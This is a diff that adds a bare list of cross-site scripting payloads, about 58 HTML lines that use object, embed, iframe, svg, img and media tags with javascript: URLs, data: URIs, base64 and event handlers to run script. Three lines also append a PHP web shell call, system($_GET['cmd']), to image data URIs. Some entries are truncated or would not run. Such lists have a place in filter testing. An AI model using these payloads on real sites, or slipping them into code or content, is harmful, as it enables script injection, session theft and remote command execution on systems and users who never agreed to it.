@@ -1,0 +1,58 @@
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>
+<img src="data:image/svg+xml;base64,PHN2ZyBvbG9hZD1hbGVydCgxKT48L3N2Zz4=">
+<svg><script>alert(1)</script></svg>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<object data="javascript:alert(1)"></object>
+<embed src="javascript:alert(1)"></embed>
+<img src=x onerror="alert(1)" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==">
+<video poster="javascript:alert(1)//"><source></video>
+<audio src="javascript:alert(1)//"><source></audio>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<embed src="data:image/svg+xml,<svg onload=alert(1)>"></embed>
+<object data="data:image/svg+xml,<svg onload=alert(1)>"></object>
+<img src="data:image/svg+xml,<svg onload=alert(1)>">
+<frame src="javascript:alert(1)">
+<frameset><frame src="javascript:alert(1)"></frameset>
+<math><maction xlink:href="javascript:alert(1)">click</maction></math>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<embed src="data:text/html,<svg onload=alert(1)>"></embed>
+<object data="data:text/html,<svg onload=alert(1)>"></object>
+<img src="x" onerror="javascript:alert(1)" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+<video><source onerror="javascript:alert(1)">
+<audio><source onerror="javascript:alert(1)">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+<object data="data:text/plain,alert(1)"></object>
+<embed src="data:text/plain,alert(1)"></embed>
+<img src="data:text/html,<script>alert(1)</script>">
+<svg onload="javascript:alert(1)"></svg>
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
+<object data="data:application/pdf,<script>alert(1)</script>"></object>
+<embed src="data:application/pdf,<script>alert(1)</script>"></embed>
+<img src="data:application/pdf,<script>alert(1)</script>">
+<video poster="data:image/svg+xml,<svg onload=alert(1)>"><source></video>
+<object data="data:image/svg+xml;base64,PHN2ZyBvbG9hZD1hbGVydCgxKT48L3N2Zz4="></object>
+<embed src="data:image/svg+xml;base64,PHN2ZyBvbG9hZD1hbGVydCgxKT48L3N2Zz4="></embed>
+<iframe src="data:image/svg+xml,<svg onload=alert(1)>"></iframe>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<object data="data:text/html,<body onload=alert(1)>"></object>
+<embed src="data:text/html,<body onload=alert(1)>"></embed>
+<img src="data:text/html,<body onload=alert(1)>">
+<video><source src="data:text/html,<script>alert(1)</script>">
+<audio><source src="data:text/html,<script>alert(1)</script>">
+<iframe srcdoc="<svg onload=alert(1)>"></iframe>
+<object data="data:text/javascript,alert(1)"></object>
+<embed src="data:text/javascript,alert(1)"></embed>
+<img src="data:text/javascript,alert(1)">
+<svg><animate attributeName="x" values="javascript:alert(1)"></animate></svg>
+<svg><handler xlink:href="javascript:alert(1)"></handler></svg>
+<object data="data:font/woff;base64,d09GRgABAAAAAA... (truncated) alert(1)"></object>
+<embed src="data:font/woff;base64,d09GRgAB... alert(1)"></embed>
+<img src="data:font/woff;base64,d09GRgAB... alert(1)">
+<video poster="data:text/html,<script>alert(1)</script>"><source></video>
+<object data="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==<?php system($_GET['cmd']); ?>"></object>
+<embed src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==<?php system($_GET['cmd']); ?>"></embed>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==<?php system($_GET['cmd']); ?>">
+<svg><image xlink:href="data:image/svg+xml;base64,PHN2ZyBvbG9hZD1hbGVydCgxKT48L3N2Zz4="></svg>
+<object data="data:text/vbscript,MsgBox(1)"></object>
+<embed src="data:text/vbscript,MsgBox(1)"></embed>
